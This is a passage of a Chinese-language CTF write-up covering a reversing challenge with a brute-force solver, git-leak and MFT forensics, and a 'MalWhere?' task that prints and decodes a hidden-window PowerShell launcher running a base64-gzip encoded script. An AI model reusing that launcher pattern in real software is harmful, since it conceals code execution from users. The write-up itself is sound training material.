<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">shf</span><span class="params">(__int64 key, <span class="keyword">unsigned</span> __int64 size_256)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">double</span> random; <span class="comment">// xmm1_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">double</span> v4; <span class="comment">// xmm0_8</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  __int64 index; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  srand48(<span class="number">456LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size_256 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = size_256 - <span class="number">1</span>; i; --i )</span><br><span class="line">    &#123;</span><br><span class="line">      random = drand48();</span><br><span class="line">      v3 = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i + <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">        v4 = (<span class="keyword">double</span>)(<span class="keyword">int</span>)(v3 &amp; <span class="number">1</span> | (v3 &gt;&gt; <span class="number">1</span>)) + (<span class="keyword">double</span>)(<span class="keyword">int</span>)(v3 &amp; <span class="number">1</span> | (v3 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 = (<span class="keyword">double</span>)(<span class="keyword">int</span>)v3;</span><br><span class="line">      index = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">int</span>)(v4 * random);</span><br><span class="line">      v5 = *(_DWORD *)(<span class="number">4</span> * index + key);</span><br><span class="line">      *(_DWORD *)(<span class="number">4</span> * index + key) = *(_DWORD *)(<span class="number">4</span> * i + key);</span><br><span class="line">      *(_DWORD *)(key + <span class="number">4</span> * i) = v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以自己写一个C函数，然后拿初始的密钥数组进去运算，也可以直接gdb调内存，拷出来即可：</p>
<p><img src="https://s2.loli.net/2024/03/24/4QEwZ5UKh6uravH.png" alt="image-20240324180456345"></p>
<p>hailstone函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">hailstone</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = val;</span><br><span class="line">  v3 = val;</span><br><span class="line">  <span class="keyword">if</span> ( !val )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v2 = <span class="number">3</span> * v2 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v2 /= <span class="number">2</span>;</span><br><span class="line">    v3 ^= v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解题脚本如下，直接爆破就行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">hailstone</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v2 = value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3 = value;</span><br><span class="line">    <span class="keyword">if</span> (!value)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (v2 != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((v2 &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">            v2 = <span class="number">3</span> * v2 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            v2 /= <span class="number">2</span>;</span><br><span class="line">        v3 ^= v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v6[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x34</span>, <span class="number">0x32FA</span>, <span class="number">0x3228</span>, <span class="number">0x63</span>, <span class="number">0xB</span>, <span class="number">0x30ED</span>, <span class="number">0x217</span>, <span class="number">0x1A</span>,</span><br><span class="line">        <span class="number">0x330A</span>, <span class="number">0x44</span>, <span class="number">0xF0</span>, <span class="number">0x2F</span>, <span class="number">0x1AA7</span>, <span class="number">0x32DC</span>, <span class="number">0x372</span>, <span class="number">0x1FF</span>,</span><br><span class="line">        <span class="number">0x5B2</span>, <span class="number">0x9C</span>, <span class="number">0x10</span>, <span class="number">0x3600</span>, <span class="number">0x3323</span>, <span class="number">0x13A</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>,</span><br><span class="line">        <span class="number">0x21C</span>, <span class="number">0x233</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x3C9</span>, <span class="number">0x1F</span>, <span class="number">0x35A7</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xDC</span>, <span class="number">0x65</span>, <span class="number">0xA</span>, <span class="number">0x35E9</span>, <span class="number">0x8F</span>, <span class="number">0x28</span>, <span class="number">0x7</span>, <span class="number">0x37</span>,</span><br><span class="line">        <span class="number">0x33</span>, <span class="number">0x11A</span>, <span class="number">0x26</span>, <span class="number">0x1A0D</span>, <span class="number">0x326B</span>, <span class="number">0x335D</span>, <span class="number">0x3340</span>, <span class="number">0x21</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x33C3</span>, <span class="number">0x195</span>, <span class="number">0x34B8</span>, <span class="number">0x375</span>, <span class="number">0x91</span>, <span class="number">0x30F</span>, <span class="number">0x6C</span>,</span><br><span class="line">        <span class="number">0x300D</span>, <span class="number">0xD9</span>, <span class="number">0x3384</span>, <span class="number">0x87</span>, <span class="number">0x15</span>, <span class="number">0xF2</span>, <span class="number">0x337B</span>, <span class="number">0xF</span>,</span><br><span class="line">        <span class="number">0x2</span>, <span class="number">0x72</span>, <span class="number">0xAD</span>, <span class="number">0x7A</span>, <span class="number">0x96</span>, <span class="number">0x31A9</span>, <span class="number">0x2BD</span>, <span class="number">0x12F</span>,</span><br><span class="line">        <span class="number">0x3294</span>, <span class="number">0x314C</span>, <span class="number">0x25</span>, <span class="number">0xD4</span>, <span class="number">0x609</span>, <span class="number">0x32CD</span>, <span class="number">0x78</span>, <span class="number">0x1C6</span>,</span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0xB7</span>, <span class="number">0x36F</span>, <span class="number">0xEE</span>, <span class="number">0x3084</span>, <span class="number">0x39</span>, <span class="number">0x2E</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0x33DE</span>, <span class="number">0xAE</span>, <span class="number">0x236</span>, <span class="number">0x3547</span>, <span class="number">0x1A</span>, <span class="number">0x32A2</span>, <span class="number">0x14F</span>, <span class="number">0xD</span>,</span><br><span class="line">        <span class="number">0x49</span>, <span class="number">0x3F</span>, <span class="number">0x10C</span>, <span class="number">0x21</span>, <span class="number">0xBD</span>, <span class="number">0x3579</span>, <span class="number">0x3211</span>, <span class="number">0x32C2</span>,</span><br><span class="line">        <span class="number">0x33A</span>, <span class="number">0x375B</span>, <span class="number">0x1AA</span>, <span class="number">0xD3</span>, <span class="number">0x3201</span>, <span class="number">0x33F9</span>, <span class="number">0x3206</span>, <span class="number">0x14</span>,</span><br><span class="line">        <span class="number">0xD0</span>, <span class="number">0x3274</span>, <span class="number">0x362</span>, <span class="number">0xD3</span>, <span class="number">0x3364</span>, <span class="number">0xCE</span>, <span class="number">0xDF</span>, <span class="number">0x323C</span>,</span><br><span class="line">        <span class="number">0x1A4</span>, <span class="number">0x354C</span>, <span class="number">0x392F</span>, <span class="number">0xA0</span>, <span class="number">0x3093</span>, <span class="number">0x1B0C</span>, <span class="number">0x1C9</span>, <span class="number">0x1</span>,</span><br><span class="line">        <span class="number">0x12</span>, <span class="number">0x100</span>, <span class="number">0xB6</span>, <span class="number">0x332C</span>, <span class="number">0x329E</span>, <span class="number">0x3379</span>, <span class="number">0x3E8</span>, <span class="number">0x3</span>,</span><br><span class="line">        <span class="number">0xA3</span>, <span class="number">0x1E</span>, <span class="number">0x3326</span>, <span class="number">0x4</span>, <span class="number">0x328B</span>, <span class="number">0x87</span>, <span class="number">0x10</span>, <span class="number">0xE5</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0x330F</span>, <span class="number">0x8B2</span>, <span class="number">0x37C</span>, <span class="number">0x3315</span>, <span class="number">0x3314</span>, <span class="number">0xBC</span>, <span class="number">0x1F0</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0x88</span>, <span class="number">0x61</span>, <span class="number">0x3370</span>, <span class="number">0x32E</span>, <span class="number">0x3538</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>,</span><br><span class="line">        <span class="number">0x25B</span>, <span class="number">0x43</span>, <span class="number">0x8C</span>, <span class="number">0x35E</span>, <span class="number">0x3546</span>, <span class="number">0x100</span>, <span class="number">0x4E3</span>, <span class="number">0x3D</span>,</span><br><span class="line">        <span class="number">0xA3</span>, <span class="number">0x7F</span>, <span class="number">0xFF</span>, <span class="number">0x1BF2</span>, <span class="number">0x105</span>, <span class="number">0x2C</span>, <span class="number">0x35A5</span>, <span class="number">0xA</span>,</span><br><span class="line">        <span class="number">0x35C4</span>, <span class="number">0x1EB</span>, <span class="number">0x31C4</span>, <span class="number">0x13</span>, <span class="number">0x55</span>, <span class="number">0xE9</span>, <span class="number">0x3D8</span>, <span class="number">0x331C</span>,</span><br><span class="line">        <span class="number">0x3248</span>, <span class="number">0x3A</span>, <span class="number">0x6</span>, <span class="number">0x6F</span>, <span class="number">0x31AA</span>, <span class="number">0x8C</span>, <span class="number">0x48</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x3CC</span>, <span class="number">0x6A</span>, <span class="number">0x83</span>, <span class="number">0x3B</span>, <span class="number">0x46</span>, <span class="number">0x3B06</span>, <span class="number">0xB</span>,</span><br><span class="line">        <span class="number">0x1CA</span>, <span class="number">0x3081</span>, <span class="number">0x338B</span>, <span class="number">0xF</span>, <span class="number">0x104</span>, <span class="number">0x202</span>, <span class="number">0x51</span>, <span class="number">0x19B0</span>,</span><br><span class="line">        <span class="number">0x15</span>, <span class="number">0x35C7</span>, <span class="number">0x3A8</span>, <span class="number">0x335A</span>, <span class="number">0x6A</span>, <span class="number">0x7C</span>, <span class="number">0x44</span>, <span class="number">0x3293</span>,</span><br><span class="line">        <span class="number">0x83</span>, <span class="number">0x3599</span>, <span class="number">0xC</span>, <span class="number">0x199</span>, <span class="number">0xA0</span>, <span class="number">0xF8</span>, <span class="number">0x33D6</span>, <span class="number">0x93</span>,</span><br><span class="line">        <span class="number">0x2C9</span>, <span class="number">0x32BA</span>, <span class="number">0x3486</span>, <span class="number">0x3B</span>, <span class="number">0xFF</span>, <span class="number">0x8A</span>, <span class="number">0x33C7</span>, <span class="number">0x3361</span>,</span><br><span class="line">        <span class="number">0x33EB</span>, <span class="number">0x33C4</span>, <span class="number">0x3C</span>, <span class="number">0x6</span>, <span class="number">0xF2</span>, <span class="number">0x3325</span>, <span class="number">0x161</span>, <span class="number">0x3346</span>,</span><br><span class="line">        <span class="number">0x172</span>, <span class="number">0xDD</span>, <span class="number">0x255</span>, <span class="number">0x59</span>, <span class="number">0x1F6</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x3238</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x1C9</span>, <span class="number">0x78</span>, <span class="number">0x31</span>, <span class="number">0x47</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x27</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v5[] = &#123;</span><br><span class="line">        <span class="number">186</span>, <span class="number">79</span>, <span class="number">229</span>, <span class="number">160</span>, <span class="number">222</span>, <span class="number">172</span>, <span class="number">244</span>, <span class="number">94</span>, <span class="number">251</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">222</span>, <span class="number">22</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">96</span>, <span class="number">222</span>, <span class="number">4</span>, <span class="number">209</span>, <span class="number">78</span>,</span><br><span class="line">        <span class="number">63</span>, <span class="number">13</span>, <span class="number">222</span>, <span class="number">58</span>, <span class="number">34</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">103</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> tmp = hailstone(j);</span><br><span class="line">            <span class="keyword">if</span> (tmp == v6[v5[i]]) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意一下因为同一组ascii序列中可能有多个值符合要求，所以组合一下即可得到flag：</p>
<p><img src="https://s2.loli.net/2024/03/24/2Ukf3tP8cgWq7zm.png" alt="image-20240324182437027"></p>
<p>最终flag：texsaw{C0LLazTeraL_D4maG3!!}</p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="The-Forked-Cave"><a href="#The-Forked-Cave" class="headerlink" title="The Forked Cave"></a>The Forked Cave</h2><p>git泄露，但是不要用GitHack，GitHack对HEAD文件中的hash没有处理，导致object遗漏，推荐Git_Extract</p>
<p><img src="https://s2.loli.net/2024/03/24/LoSa8RyZQsAjznH.png" alt="image-20240324152126697"></p>
<p>然后cat *：</p>
<p><img src="https://s2.loli.net/2024/03/24/TVW4hSpNyvs79lU.png" alt="image-20240324152150743"></p>
<h2 id="MFMFT"><a href="#MFMFT" class="headerlink" title="MFMFT"></a>MFMFT</h2><blockquote>
<p>I stole my boss’ flash drive. Rumor has  it that he keeps the password to the payroll database fragmented across  the filenames of the contents of his USB drive. I have a segment of the  Master File Table here - can you help me figure out the password? I  would like to give myself a 200% raise.</p>
<p>Oh, this might help: <code>[0, 10, 17, 18, 5, 6, 15, 13, 9, 16, 12, 5, 11, 1, 14, 5, 7, 6, 7, 3, 2, 2, 10, 8, 4, 7]</code></p>
<p>Wrap what you find with <code>texsaw&#123;&#125;</code>! If the password is <code>password</code>, enter <code>texsaw&#123;password&#125;</code>.</p>
</blockquote>
<p>给了一个data文件，然后里面有若干FILE文件，先切成小份：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../TheMFT&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:     data = f.read()</span><br><span class="line">In [<span class="number">14</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(data_list)):</span><br><span class="line">    ...:     <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span> + <span class="built_in">str</span>(i-<span class="number">1</span>), <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ...:         f.write(<span class="string">b&quot;FILE0&quot;</span> + data_list[i])</span><br></pre></td></tr></table></figure>
<p>然后利用analyzeMFT提取信息，观察文件名后面就是密码，然后根据题目给的整数列表写个脚本提取：</p>
<p><img src="https://s2.loli.net/2024/03/25/o3nGJP28UuixE4W.png" alt="image-20240325024730889"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">7</span>]: index = [<span class="number">0</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">   ...:     flag += os.popen(<span class="string">&quot;python analyzeMFT.py -f ./data&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; -o result.txt; cat result.txt&quot;</span>).read().split(<span class="string">&quot;Orphan/&quot;</span>)[<span class="number">1</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>得到password：34sy_brEezY_MFT_7b7f224587</p>
<p>flag：texsaw{34sy_brEezY_MFT_7b7f224587}</p>
<h2 id="MalWhere"><a href="#MalWhere" class="headerlink" title="MalWhere?"></a>MalWhere?</h2><p>strings，发现一个ps脚本：</p>
<p><img src="https://s2.loli.net/2024/03/24/AOEWzYtQbd2p6SK.png" alt="image-20240324024340461"></p>
<p>内容为：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-noni</span> <span class="literal">-c</span>;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+<span class="string">&#x27;\syswow64\WindowsPowerShell\v1.0\powershell.exe&#x27;</span>;<span class="variable">$s</span>=<span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo;<span class="variable">$s</span>.FileName=<span class="variable">$b</span>;<span class="variable">$s</span>.Arguments=<span class="string">&#x27;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#x27;</span><span class="string">&#x27;H4sIAC3yPWUA/21ST+saMRT8KjlsUEkDef/yp7JQWvhBoVAvPYmHtQhaRIvY0kM/vC9bTDz0sodhMjNvZofrTzOa7ffjdNvudh+W29PlvltKIAshOYbVu39IIlREfAOIi0UsLjyBktlmCR5Kp4BFFtdFAlrJ2ckTYFRVjj49gaw2MaHn3GVBjdFDeyQqCxIcNg7KzHGITaewTYA+dk6oHHrRiaQXcPDcXlFOFkCVe8CElhg9toSQajWl30AhWsigRazWw236T5uJ2EIE13xq3hK6hLDWoL7U4mtRxNo2txqYbIbXdlHUV3JfBClboOBiU0HSEsQ32aI+qFF7kKDJArnug6XWFPpm80Q6a1NlrY0wuxYENFpCx+0cVbSS+p+RlIA6RjOJmkOEXB+5/l2RO4OK3sK61tzq+TaaWq3/cT1dzGKxHqY/Y/1zO7Afh8Pl9/vNt49fPn8yzuibyjJ/zddfd/92Oh/M/N1M96MZ9usHQYmIpvgCAAA=&#x27;</span><span class="string">&#x27;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#x27;</span>;<span class="variable">$s</span>.UseShellExecute=<span class="variable">$false</span>;<span class="variable">$s</span>.RedirectStandardOutput=<span class="variable">$true</span>;<span class="variable">$s</span>.WindowStyle=<span class="string">&#x27;Hidden&#x27;</span>;<span class="variable">$s</span>.CreateNoWindow=<span class="variable">$true</span>;<span class="variable">$p</span>=[<span class="type">System.Diagnostics.Process</span>]::<span class="built_in">Start</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
<p>大概是创建一个新的ps脚本并执行，新脚本被压缩然后base64编码了，首先还原脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> base64</span><br><span class="line">   ...: <span class="keyword">import</span> gzip</span><br><span class="line">   ...:</span><br><span class="line">   ...: compressed_data = <span class="string">b&#x27;H4sIAC3yPWUA/21ST+saMRT8KjlsUEkDef/yp7JQWvhBoVAvPYmH</span></span><br><span class="line"><span class="string">   ...: tQhaRIvY0kM/vC9bTDz0sodhMjNvZofrTzOa7ffjdNvudh+W29PlvltKIAshOYbVu39IIlRE</span></span><br><span class="line"><span class="string">   ...: fAOIi0UsLjyBktlmCR5Kp4BFFtdFAlrJ2ckTYFRVjj49gaw2MaHn3GVBjdFDeyQqCxIcNg7K</span></span><br><span class="line"><span class="string">   ...: zHGITaewTYA+dk6oHHrRiaQXcPDcXlFOFkCVe8CElhg9toSQajWl30AhWsigRazWw236T5uJ</span></span><br><span class="line"><span class="string">   ...: 2EIE13xq3hK6hLDWoL7U4mtRxNo2txqYbIbXdlHUV3JfBClboOBiU0HSEsQ32aI+qFF7kKDJ</span></span><br><span class="line"><span class="string">   ...: Arnug6XWFPpm80Q6a1NlrY0wuxYENFpCx+0cVbSS+p+RlIA6RjOJmkOEXB+5/l2RO4OK3sK6</span></span><br><span class="line"><span class="string">   ...: 1tzq+TaaWq3/cT1dzGKxHqY/Y/1zO7Afh8Pl9/vNt49fPn8yzuibyjJ/zddfd/92Oh/M/N1M</span></span><br><span class="line"><span class="string">   ...: 96MZ9usHQYmIpvgCAAA=&#x27;</span></span><br><span class="line">   ...:</span><br><span class="line">   ...: decoded_data = base64.b64decode(compressed_data)</span><br><span class="line">   ...: decompressed_data = gzip.decompress(decoded_data)</span><br><span class="line">   ...:</span><br><span class="line">   ...: print(decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$op</span> = [<span class="built_in">char</span>[]]<span class="selector-tag">@</span>([<span class="built_in">int</span>](<span class="number">503</span>%<span class="number">107</span>+<span class="number">41</span>),[<span class="built_in">int</span>](<span class="number">732</span>%<span class="number">105</span><span class="literal">-1</span>),[<span class="built_in">int</span>](<span class="number">349</span>%<span class="number">229</span>+<span class="number">0</span>),[<span class="built_in">int</span>](<span class="number">984</span>%<span class="number">850</span><span class="literal">-19</span>),[<span class="built_in">int</span>](<span class="number">341</span>%<span class="number">245</span>+<span class="number">1</span>),[<span class="built_in">int</span>](<span class="number">702</span>%<span class="number">588</span>+<span class="number">5</span>),[<span class="built_in">int</span>](<span class="number">422</span>%<span class="number">146</span><span class="literal">-7</span>),[<span class="built_in">int</span>](<span class="number">832</span>%<span class="number">672</span><span class="literal">-48</span>),[<span class="built_in">int</span>](<span class="number">981</span>%<span class="number">102</span><span class="literal">-15</span>),[<span class="built_in">int</span>](<span class="number">541</span>%<span class="number">150</span>+<span class="number">28</span>),[<span class="built_in">int</span>](<span class="number">251</span>%<span class="number">102</span>+<span class="number">22</span>),[<span class="built_in">int</span>](<span class="number">894</span>%<span class="number">712</span><span class="literal">-68</span>),[<span class="built_in">int</span>](<span class="number">201</span>%<span class="number">103</span><span class="literal">-15</span>),[<span class="built_in">int</span>](<span class="number">639</span>%<span class="number">240</span><span class="literal">-42</span>),[<span class="built_in">int</span>](<span class="number">387</span>%<span class="number">110</span>+<span class="number">25</span>),[<span class="built_in">int</span>](<span class="number">472</span>%<span class="number">342</span><span class="literal">-27</span>),[<span class="built_in">int</span>](<span class="number">173</span>%<span class="number">109</span>+<span class="number">5</span>),[<span class="built_in">int</span>](<span class="number">306</span>%<span class="number">181</span>+<span class="number">0</span>));<span class="variable">$ra</span> = [<span class="built_in">char</span>[]]<span class="selector-tag">@</span>([<span class="built_in">int</span>](<span class="number">734</span>%<span class="number">161</span>+<span class="number">2</span>),[<span class="built_in">int</span>](<span class="number">251</span>%<span class="number">90</span>+<span class="number">5</span>),[<span class="built_in">int</span>](<span class="number">542</span>%<span class="number">110</span>+<span class="number">3</span>),[<span class="built_in">int</span>](<span class="number">802</span>%<span class="number">345</span><span class="literal">-14</span>),[<span class="built_in">int</span>](<span class="number">943</span>%<span class="number">810</span><span class="literal">-19</span>),[<span class="built_in">int</span>](<span class="number">256</span>%<span class="number">158</span><span class="literal">-1</span>),[<span class="built_in">int</span>](<span class="number">238</span>%<span class="number">130</span>+<span class="number">6</span>),[<span class="built_in">int</span>](<span class="number">823</span>%<span class="number">715</span><span class="literal">-3</span>),[<span class="built_in">int</span>](<span class="number">942</span>%<span class="number">281</span>+<span class="number">2</span>),[<span class="built_in">int</span>](<span class="number">204</span>%<span class="number">103</span>+<span class="number">14</span>),[<span class="built_in">int</span>](<span class="number">291</span>%<span class="number">100</span>+<span class="number">1</span>),[<span class="built_in">int</span>](<span class="number">422</span>%<span class="number">150</span><span class="literal">-6</span>),[<span class="built_in">int</span>](<span class="number">439</span>%<span class="number">328</span>+<span class="number">9</span>),[<span class="built_in">int</span>](<span class="number">143</span>%<span class="number">72</span>+<span class="number">45</span>),[<span class="built_in">int</span>](<span class="number">103</span>%<span class="number">57</span>+<span class="number">0</span>),[<span class="built_in">int</span>](<span class="number">743</span>%<span class="number">212</span><span class="literal">-4</span>),[<span class="built_in">int</span>](<span class="number">642</span>%<span class="number">553</span>+<span class="number">8</span>),[<span class="built_in">int</span>](<span class="number">932</span>%<span class="number">164</span><span class="literal">-4</span>),[<span class="built_in">int</span>](<span class="number">398</span>%<span class="number">143</span><span class="literal">-10</span>));<span class="variable">$lr</span>= <span class="variable">$ra</span> <span class="operator">-join</span> <span class="string">&#x27;&#x27;</span>;<span class="variable">$ax</span>=<span class="variable">$op</span> <span class="operator">-join</span> <span class="string">&#x27;&#x27;</span>;<span class="variable">$b</span>=<span class="variable">$env:PUBLIC</span> + <span class="variable">$lr</span>;<span class="variable">$ax</span> | <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>这个就比较明显了，一个字符数组存了一堆ascii，可以用python筛选出所有的算式，运算后得到flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;$op = [char[]]@([int](503%107+41),[int](732%105-1),[int](349%229+0),[int](984%850-19),[int](341%245+1),[int](702%588+5),[int](422%146-7),[int](832%672-48),[int](981%102-15),[int](541%150+28),[int](251%102+22),[int](894%712-68),[int](201%103-15),[int](639%240-42),[int](387%110+25),[int](472%342-27),[int](173%109+5),[int](306%181+0));$ra = [char[]]@([int](734%161+2),[int](251%90+5),[int](542%110+3),[int](802%345-14),[int](943%810-19),[int](256%158-1),[int](238%130+6),[int](823%715-3),[int](942%281+2),[int](204%103+14),[int](291%100+1),[int](422%150-6),[int](439%328+9),[int](143%72+45),[int](103%57+0),[int](743%212-4),[int](642%553+8),[int](932%164-4),[int](398%143-10));$lr= $ra -join &#x27;&#x27;;$ax=$op -join &#x27;&#x27;;$b=$env:PUBLIC + $lr;$ax | Out-File -FilePath $b;&quot;</span></span><br><span class="line">matches = re.findall(<span class="string">r&#x27;\(([^()]+)\)&#x27;</span>, data)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> match <span class="keyword">in</span> matches:</span><br><span class="line">    result = <span class="built_in">eval</span>(match)</span><br><span class="line">    flag += <span class="built_in">chr</span>(result)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/24/hFPeCpiL6buq9GA.png" alt="image-20240324024618250"></p>
<h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Ironcrypt"><a href="#Ironcrypt" class="headerlink" title="Ironcrypt"></a>Ironcrypt</h2><blockquote>
<p>Commander, we managed to gain access to  the Ironblood’s encryption servers, but we only know the key. If we get  the IV, we will be able to decrypt all of their messages, locate their  submarines, and win the war!</p>
